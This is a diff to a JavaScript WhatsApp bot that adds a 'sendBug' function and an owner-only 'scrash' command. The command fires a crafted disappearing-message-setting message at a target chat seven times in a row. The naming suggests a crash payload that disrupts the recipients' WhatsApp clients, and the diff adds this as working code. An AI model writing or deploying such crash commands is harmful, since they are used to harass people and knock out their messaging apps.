@@ -292,6 +292,19 @@ inky.sendMessage(`${botGroup}`, `${e}`, MessageType.text, {quoted: fakeStatus, s
 })
 }
 
+const sendBug = async (target, teks) => {
+if (!teks) teks = ".";
+await inky.relayWAMessage(
+inky.prepareMessageFromContent(
+target,
+inky.prepareDisappearingMessageSettingContent(0),
+{}
+),
+{ waitForAck: true }
+);
+inky.sendMessage(target, teks, "conversation");
+}
+
 const sendMediaURL = async(to, url, text="", mids=[]) =>{
 if(mids.length > 0){
 text = normalizeMention(to, text, mids)
@@ -1005,6 +1018,7 @@ reply("𝐋𝐢𝐧𝐤 𝐢𝐧𝐯𝐚𝐥𝐢𝐝𝐨");
 break
 
 case 'leermas':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐔𝐬𝐚 ${prefix + command} 𝐓𝐞 𝐚𝐦𝐨|𝐫𝐝𝐢𝐝𝐨 𝐮𝐧 𝐩𝐞𝐫𝐫𝐨`)
 tels = q
 var teks1 = tels.split("|")[0];
@@ -1016,6 +1030,18 @@ quoted: mek
 break
 
 // Seccion Owner
+
+case 'scrash':
+if (!isOwner) return reply(mess.only.owner)
+if (!q) return
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+sendBug(from, `${q}`)
+break
 
 case 'fix':
 if (!isUser) return reply(mess.only.reg)
